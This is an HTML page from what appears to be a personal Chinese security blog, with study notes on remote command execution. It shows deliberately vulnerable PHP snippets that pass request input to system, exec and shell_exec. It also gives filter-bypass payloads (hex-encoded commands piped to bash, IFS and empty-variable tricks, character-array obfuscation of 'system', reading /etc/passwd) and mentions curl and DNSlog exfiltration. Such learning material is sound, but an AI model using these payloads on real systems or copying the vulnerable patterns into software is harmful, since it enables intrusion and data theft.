@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>RCE · 随波逐流の旅店</title>
+<style>:root{--ink:#eaf3ff;--muted:#a9c3dd;--line:rgba(255,255,255,.2);--sky:#3aa3e3;--gold:#e0a545}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0}
+body{min-height:100vh;color:var(--ink);font:16px/1.85 "PingFang SC","Microsoft YaHei",system-ui,-apple-system,sans-serif;background:#0d2137 url('/SAO-bg.jpg') center/cover fixed no-repeat}
+body::before{content:'';position:fixed;inset:0;background:rgba(8,20,36,.7);z-index:-1}
+.pill{display:inline-flex;align-items:center;gap:8px;padding:7px 16px;border-radius:999px;background:rgba(226,236,248,.16);border:1px solid var(--line);color:#fff;text-decoration:none;font-size:14px;backdrop-filter:blur(12px);transition:.3s}
+.pill:hover{background:rgba(58,163,227,.5)}
+.wrap{max-width:860px;margin:0 auto;padding:44px 22px 80px}
+.panel{margin-top:18px;background:rgba(12,26,44,.62);border:1px solid var(--line);border-radius:20px;padding:34px 36px;backdrop-filter:blur(18px) saturate(140%);box-shadow:0 20px 50px rgba(5,16,30,.4)}
+h1{margin:0 0 14px;font-size:29px;line-height:1.4;color:#fff}
+.meta{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:24px;padding-bottom:18px;border-bottom:1px dashed var(--line)}
+.chip{padding:2px 11px;border-radius:999px;background:rgba(255,255,255,.12);border:1px solid var(--line);font-size:12px;color:var(--muted)}
+.chip.date{color:var(--gold)}
+article h2,article h3,article h4{color:#fff;margin:1.6em 0 .6em;line-height:1.45}
+article h2{font-size:23px;border-left:3px solid var(--sky);padding-left:12px}
+article h3{font-size:19px;color:#dcecff}
+article p{margin:.85em 0}
+article a{color:#8fd0ff}
+article img{max-width:100%;border-radius:10px;margin:14px 0}
+article ul,article ol{padding-left:1.5em}
+article li{margin:.35em 0}
+article blockquote{margin:1.2em 0;padding:10px 18px;border-left:3px solid var(--sky);background:rgba(255,255,255,.07);border-radius:0 10px 10px 0;color:var(--muted)}
+article code{background:rgba(255,255,255,.14);padding:2px 6px;border-radius:5px;font-size:.9em;color:#ffd9a8;font-family:Consolas,Monaco,monospace}
+article pre{background:rgba(6,14,26,.85);border:1px solid var(--line);border-radius:12px;padding:16px 18px;overflow:auto;margin:1.2em 0}
+article pre code{background:none;padding:0;color:#d6e6f7;font-size:13.5px;line-height:1.7}
+article table{width:100%;border-collapse:collapse;margin:1.2em 0;font-size:14px}
+article th,article td{border:1px solid var(--line);padding:8px 12px;text-align:left}
+article th{background:rgba(255,255,255,.07);color:#fff}
+article hr{border:none;border-top:1px dashed var(--line);margin:2em 0}
+.img-fallback{display:block;padding:18px;margin:14px 0;border:1px dashed var(--line);border-radius:10px;background:rgba(255,255,255,.05);color:var(--muted);font-size:13px;text-align:center}
+@media(max-width:640px){.panel{padding:22px 18px}.wrap{padding:24px 14px 60px}h1{font-size:22px}}</style>
+</head>
+<body>
+<div class="wrap">
+  <a class="pill" href="/article-list/">← 返回归档</a> <a class="pill" href="/">⌂ 主页</a>
+  <div class="panel">
+    <h1>RCE</h1>
+    <div class="meta"><span class="chip date">2024-07-26</span><span class="chip">分类·渗透</span><span class="chip">#渗透</span></div>
+    <article><h1>rce</h1>
+<h2>漏洞描述</h2>
+<p>rce是指服务器没有对执行的命令进行过滤，用户可以任意的调用系统命令</p>
+<h2>漏洞原理</h2>
+<p>应用程序有时需要调用一些执行系统命令的函数,如在PHP中，使用<code>system、exec、shell_exec、passthru、popen、proc_popen</code>等函数可以执行系统命令，当黑客能控制这些函数中的参数时，就可以将恶意的系统命令拼接到正常命令中，从而造成命令执行</p>
+<h2>漏洞危害</h2>
+<p>可以继承web服务器权限，反弹shell</p>
+<h2>产生原因</h2>
+<ul>
+<li>过滤不严</li>
+<li>系统存在漏洞</li>
+<li>第三方插件</li>
+</ul>
+<h2>rce何代码执行的区别</h2>
+<ul>
+<li>代码执行：执行效果完全依赖于语言本身</li>
+<li>命令执行：执行效果不受语言本身、命令本身的限制</li>
+</ul>
+<h2>常见的危险函数</h2>
+<pre><code>1. php代码相关
+  eval()
+  assert()
+  preg_replace
+  call_user_func()
+  call_user_func_array()
+  create_function
+  array_map()
+2. 系统命令执行相关
+  system()
+  passthru()
+  exec()
+  pcntl_exec()
+  shell_exec()
+  popen()
+  proc_open()
+  `(反单引号)
+  ob_start()
+3. 特殊函数
+  phpinfo()
+  #这个文件里面包含了PHP的编译选项，启动的扩展、版本、服务器配置信息、环境变量、操作系统信息、path变量等非常重要的敏感配置信息
+  symlink()：
+  #一般是在linux服务器上使用的，为一个目标建立一个连接，在读取这个链接所连接的文件的内容，并返回内容
+  getenv
+  #获取一个环境变量的值
+  putenv($a)
+  #添加$a到服务器环境变量，但环境变量仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态
+</code></pre>
+<h2>危险函数调用</h2>
+<h3>system</h3>
+<p><code>system</code> --执行外部程序并且显示输出</p>
+<p>用法：<code>system(string $command,int &amp;$return_var=?):string</code></p>
+<pre><code>system:函数名字
+string $command表示这个函数的第一个参数是一个string类型的字符串
+&amp;$return_var没有错，&amp;表示的是这个参数是通过引用传递的
+</code></pre>
+<p>引用传递
+就是通过引用传递函数可以让函数修改调用者传递进来的变量的值。</p>
+<pre><code class="language-简单的例子">&lt;?php
+// 定义一个函数，接受一个整数参数通过引用传递
+function doubleValue(&amp;$num) {
+    $num *= 2; // 将传递进来的参数乘以2
+}
+
+// 定义一个变量
+$value = 10;
+
+// 调用函数，传递变量 $value 作为参数
+doubleValue($value);
+
+// 输出变量 $value 的值，应为原来的值乘以2
+echo $value; // 输出 20
+?&gt;
+</code></pre>
+<p>在这个示例中，<code>doubleValue</code> 函数接受一个参数 <code>$num</code>，这个参数通过引用传递（使用 &amp; 符号）。在函数内部，参数 <code>$num</code> 的值被乘以2。当在调用代码中将变量 <code>$value</code> 传递给函数时，函数修改了这个变量的值，使得最终输出结果为 20。</p>
+<pre><code class="language-system">&lt;?php
+highlight_file(__FILE__);
+
+if(isset($_REQUEST[&#39;url&#39;])){
+    $url = ($_REQUEST[&#39;url&#39;]);
+    $b = system($url, $a);
+    echo $a.PHP_EOL;
+    echo $b.PHP_EOL;
+}
+?&gt;
+</code></pre>
+<p>这里调用system函数获取了url的数值进行,php_eol是换行符
+<code>执行url=dir</code>
+<a href="https://imgse.com/i/pkbTI41"><img src="https://s21.ax1x.com/2024/07/26/pkbTI41.png" alt="pkbTI41.png"></a></p>
+<h3>passthru</h3>
+<p><code>passthru</code> -- 执行外部程序并且显示原始输出</p>
+<p>用法：<code>passthru(string $command,int &amp;$return_var=?):void</code></p>
+<pre><code class="language-passthru">&lt;?php
+highlight_file(__FILE__);
+
+if(isset($_REQUEST[&#39;url&#39;])){
+    $url = ($_REQUEST[&#39;url&#39;]);
+    passthru($url,$a);
+    echo $a.PHP_EOL;
+}
+?&gt;
+</code></pre>
+<p>执行命令<code>?url=dir &gt; 22.txt</code></p>
+<p><a href="https://imgse.com/i/pkbTT9x"><img src="https://s21.ax1x.com/2024/07/26/pkbTT9x.png" alt="pkbTT9x.png"></a></p>
+<h3>exec</h3>
+<p><code>exec</code> --执行一个外部程序</p>
+<p><code>exec(string $commadn,array &amp;$output=?,int &amp;$return_var=?):string</code></p>
+<pre><code class="language-exec">
+&lt;?php
+highlight_file(__FILE__);
+
+if(isset($_REQUEST[&#39;url&#39;])){
+    $url = ($_REQUEST[&#39;url&#39;]);
+    echo exec($url);
+}
+?&gt;
+</code></pre>
+<pre><code class="language-执行命令">?url=echo falgistrue &gt; 222.txt
+</code></pre>
+<p><a href="https://imgse.com/i/pkb798P"><img src="https://s21.ax1x.com/2024/07/26/pkb798P.png" alt="pkb798P.png"></a></p>
+<h3>shell_exec</h3>
+<p><code>shell_exec(string $cmd ):string</code></p>
+<pre><code>&lt;?php
+highlight_file(__FILE__);
+
+if(isset($_REQUEST[&#39;url&#39;])){
+    $url = ($_REQUEST[&#39;url&#39;]);
+    echo shell_exec($url);
+}
+?&gt;
+</code></pre>
+<pre><code class="language-执行代码">echo falgistrue &gt; 221.txt
+</code></pre>
+<p><a href="https://imgse.com/i/pkb7GVJ"><img src="https://s21.ax1x.com/2024/07/26/pkb7GVJ.png" alt="pkb7GVJ.png"></a></p>
+<h3>反引号</h3>
+<pre><code>&lt;?php
+highlight_file(__FILE__);
+
+if(isset($_REQUEST[&#39;url&#39;])){
+    $url = ($_REQUEST[&#39;url&#39;]);
+    echo `$url`;
+}
+?&gt;
+</code></pre>
+<h2>OS命令执行</h2>
+<h3>windows支持的管道符</h3>
+<pre><code>|
+</code></pre>
+<p>直接执行后面的语句，不管前面的是否可以</p>
+<p><a href="https://imgse.com/i/pkbH3SP"><img src="https://s21.ax1x.com/2024/07/26/pkbH3SP.png" alt="pkbH3SP.png"></a></p>
+<pre><code>||
+</code></pre>
+<p>前面的语句执行错误才可以执行后面的</p>
+<pre><code>&amp;
+</code></pre>
+<p>如果前面的语句为假则直接执行后面的语句，前面的语句可真可假</p>
+<pre><code>&amp;&amp;
+</code></pre>
+<p>如果前面的语句为真先执行第一个命令后执行第二个命令；为假则直接出错，也不执行后面的语句</p>
+<h3>linux支持的管道符</h3>
+<pre><code>;
+</code></pre>
+<p>执行完前面的执行后面的</p>
+<pre><code>
+|,||,&amp;,&amp;&amp;
+</code></pre>
+<p>等于windows的</p>
+<h3>Java</h3>
+<p>Java SE 中，存在Runtime 类，在该类中提供了exec 方法用以在单独的进程中执行指定的字符串命令，像JSP、Servlet、 Struts、 Spring、 Hibernate 等技术一般执行外部程序都会调用此方法（或者使用ProcessBuilder类，但较少）</p>
+<pre><code>import java. io.InputStream;  //导包操作
+import java. io.InputStreamReader;
+import java. io.BufferedReader;
+public class RuntimeTest{
+  public static void main (String args []) throws Exception{
+    if (args.length==0) {
+      System.exit(1);  //没有参数就退出
+    }
+    String command = args[0];
+    Runtime run = Runtime.getRuntime();
+    Process pro = run. exec(command);  //执行命令
+    InputStreamReader in = new InputStreamReader(pro.getInputStream());
+    BufferedReader buff = new BufferedReader(in);
+    for(String temp = buff.readLine();temp!=null;temp=buff.readLine()){
+      System.out.println(temp);  //输出结果
+    }
+  buff .close();
+  in.close();
+  }
+}
+</code></pre>
+<p><a href="https://i-blog.csdnimg.cn/blog_migrate/09d9415acac67ac95c041a356d92fc63.png">https://i-blog.csdnimg.cn/blog_migrate/09d9415acac67ac95c041a356d92fc63.png</a>
+(先拿别人的图凑数(bushi))</p>
+<h3>python</h3>
+<pre><code>exec(string)		# Python代码的动态执行
+eval(string)		# 返回表达式或代码对象的值
+execfile(string)	# 从一个文件中读取和执行Python脚本
+input(string)		# Python2.x 中 input() 相等于 eval(raw_input(prompt)) ，用来获取控制台的输入
+compile(string)		# 将源字符串编译为可执行对象
+</code></pre>
+<p>命令执行</p>
+<pre><code>system()		# 执行系统指令
+popen()			# popen()方法用于从一个命令打开一个管道
+subprocess.call # 执行由参数提供的命令
+spawn 			# 执行命令
+</code></pre>
+<h2>绕过</h2>
+<p><a href="https://blog.csdn.net/qq_41315957/article/details/118855865">https://blog.csdn.net/qq_41315957/article/details/118855865</a></p>
+<h3>编码绕过</h3>
+<p>如果过滤了一些分隔符，可以尝试讲分隔符编码(url,base64)绕过</p>
+<h3>八进制绕过</h3>
+<pre><code>$(printf &quot;\154\163&quot;)
+</code></pre>
+<p>就是ls</p>
+<h3>十六进制</h3>
+<pre><code>echo &quot;636174202F6574632F706173737764&quot; | xxd -r -p|bash
+</code></pre>
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ echo &quot;636174202F6574632F706173737764&quot; | xxd -r -p|bash
+root:x:0:0:root:/root:/usr/bin/zsh
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+···太长了后面省略了
+</code></pre>
+<p>十六进制还有个字符串过滤的</p>
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ php -r &#39;&quot;\x73\x79\x73\x74\x65\x6d&quot;(&quot;cat /etc/passwd&quot;);&#39;
+root:x:0:0:root:/root:/usr/bin/zsh
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+</code></pre>
+<h3>空格绕过</h3>
+<p>linux内置的分隔符${IFS}，$IFS，$IFS$9</p>
+<p>或者利用重定向符&lt;&gt;</p>
+<h3>+，&gt;过滤</h3>
+<p>对于 &gt;,+ 等 符号的过滤 ，<code>$PS2变量为&gt;，$PS4变量则为+</code></p>
+<h3>关键字绕过</h3>
+<pre><code>通过拆分命令达到绕过的效果：a=l;b=s;$a$b
+空变量绕过：cat fl${x}ag cat tes$(z)t/flag
+控制环境变量绕过：
+先利用echo $PATH得到环境变量 =&gt; &quot;/usr/local/….blablabla”
+接着利用echo ${#PATH}得到长度
+然后要哪个字符截取哪个字符就行
+${PATH:0:1} =&gt; ‘/’
+${PATH:1:1} =&gt; ‘u’
+${PATH:0:4} =&gt; ‘/usr’
+空值绕过：cat fl&quot;&quot;ag cat fl&#39;&#39;ag cat &quot;fl&quot;&quot;ag&quot;
+反斜杠绕过：ca\t flag l\s
+</code></pre>
+<pre><code class="language-PATH">┌──(kali㉿kali)-[~]
+└─$ echo $PATH
+/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/home/kali/.dotnet/tools
+
+┌──(kali㉿kali)-[~]
+└─$ echo ${PATH}
+/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/home/kali/.dotnet/tools
+
+┌──(kali㉿kali)-[~]
+└─$ echo ${PATH:1:1}
+u
+
+┌──(kali㉿kali)-[~]
+└─$ echo ${PATH:0:5}
+/usr/
+</code></pre>
+<h3>空变量</h3>
+<p>$*和$@，$x(x 代表 1-9)，${x}(x&gt;=10)：比如ca${21}t a.txt表示cat a.txt
+在没有传入参数的情况下，这些特殊字符默认为空，如下:</p>
+<pre><code>wh$1oami
+
+who$@ami
+
+whoa$*mi
+</code></pre>
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ cat 1.txt
+$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41
+
+┌──(kali㉿kali)-[~]
+└─$ ca{123}t 1.txt
+ca{123}t：未找到命令
+
+┌──(kali㉿kali)-[~]
+└─$ ca${123}t 1.txt
+$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41
+</code></pre>
+<h3>花括号</h3>
+<p>在Linux bash中还可以使用<code>{OS_COMMAND,ARGUMENT}</code>来执行系统命令<code>{cat,flag}</code></p>
+<p>但是我反复尝试都不行，也不知道是为啥</p>
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ {cat,1.txt}
+cat,1.txt：未找到命令
+
+┌──(kali㉿kali)-[~]
+└─$ ${cat,1.txt}
+zsh: bad substitution
+
+┌──(kali㉿kali)-[~]
+└─$ ${cat,/etc/passwd}
+zsh: bad substitution
+
+┌──(kali㉿kali)-[~]
+└─$ {cat,/etc/passwd}
+zsh: 没有那个文件或目录: cat,/etc/passwd
+
+┌──(kali㉿kali)-[~]
+└─$ {cat,/etc/passwd}
+zsh: 没有那个文件或目录: cat,/etc/passwd
+</code></pre>
+<h3>无回显的命令执行</h3>
+<p>curl将命令的结果输出到访问的url中，可以在服务器中发现
+（还没尝试，应该可行）</p>
+<p><a href="https://imgse.com/i/pkbHlWt"><img src="https://s21.ax1x.com/2024/07/26/pkbHlWt.png" alt="pkbHlWt.png"></a></p>
+<h3>get_defined_functions</h3>
+<p><code>php -r &#39;print_r(get_defined_functions()[&quot;internal&quot;]);&#39; | grep &#39;system&#39;</code></p>
+<p>这个PHP系统函数会返回一个多维数组，该数组包含一个所有已定义函数（包括内部函数和用户定义函数）列表。内部函数可以通过$arr[&quot;internal&quot;]来表示，用户定义的函数可以使用$arr[&quot;user&quot;]来表示。</p>
+<p>用法</p>
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ php -r &#39;print_r(get_defined_functions()[&quot;internal&quot;]);&#39; | grep &#39;system&#39;
+    [562] =&gt; system
+
+┌──(kali㉿kali)-[~]
+└─$ php -r &#39;print_r(get_defined_functions()[&quot;internal&quot;][&quot;562&quot;](&quot;whoami&quot;));&#39;
+kali
+kali
+</code></pre>
+<h3>字符数组</h3>
+<p>PHP中的每个字符串都可视为一个字符数组，并且可以通过语法$string[2]或 $string[-3]来引用单个字符，这同时也是另一种绕过安全规则的方法
+例如，仅仅使用字符串$a=&quot;elmsty/ &quot;;，我就可以组成命令执行语句system(&quot;ls /tmp&quot;);</p>
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ php -r &#39;$s=&quot;elmsty/ &quot;; ($s[3].$s[5].$s[3].$s[4].$s[0].$s[2])($s[1].$s[3].$s[-1].$s[-2].&quot;tmp&quot;);&#39;
+ssh-IsnyfG8atHyV
+systemd-private-4ca3281a17864fe887e7753be4b15603-colord.service-LL67Bu
+systemd-private-4ca3281a17864fe887e7753be4b15603-haveged.service-mIMcQ1
+systemd-private-4ca3281a17864fe887e7753be4b15603-ModemManager.service-Ht7xiS
+systemd-private-4ca3281a17864fe887e7753be4b15603-polkit.service-Zscji7
+systemd-private-4ca3281a17864fe887e7753be4b15603-systemd-logind.service-MwIoxj
+systemd-private-4ca3281a17864fe887e7753be4b15603-systemd-timesyncd.service-qVL8zc
+systemd-private-4ca3281a17864fe887e7753be4b15603-upower.service-2qUlm5
+VMwareDnD
+vmware-root_620
+</code></pre>
+<h3>引号逃逸</h3>
+<p><code>$a = (string)foo;在这种情况下，变量$a就是字符串“foo”</code></p>
+<p><a href="https://i-blog.csdnimg.cn/blog_migrate/e401020e7f9c2719f702aebd942af74f.png">https://i-blog.csdnimg.cn/blog_migrate/e401020e7f9c2719f702aebd942af74f.png</a></p>
+<p><a href="https://imgse.com/i/pkbHgw4"><img src="https://s21.ax1x.com/2024/07/26/pkbHgw4.png" alt="pkbHgw4.png"></a></p>
+<h3>DNSlog外带</h3>
+<p><a href="https://imgse.com/i/pkbHWk9"><img src="https://s21.ax1x.com/2024/07/26/pkbHWk9.png" alt="pkbHWk9.png"></a></p>
+<p>当你有一个二级域名，比如test.vernus.top当有主机风闻1111.test.vernus.top的时候，就会被记录下来解析请求，这里的话我们就可以将代码放到前面了</p>
+<p>具体可以参考这个</p>
+<p><a href="https://www.cnblogs.com/hellobao/articles/17266933.html">https://www.cnblogs.com/hellobao/articles/17266933.html</a></p>
+</article>
+  </div>
+</div><script>
+  // 正文插图兜底：失效图片替换为占位块，避免出现破图
+  document.querySelectorAll('article img').forEach(function (img) {
+    img.loading = 'lazy';
+    img.addEventListener('error', function () {
+      var ph = document.createElement('span');
+      ph.className = 'img-fallback';
+      ph.textContent = '图片已失效 · ' + (img.getAttribute('alt') || '');
+      if (img.parentNode) img.parentNode.replaceChild(ph, img);
+    });
+  });
+</script></body>
+</html>
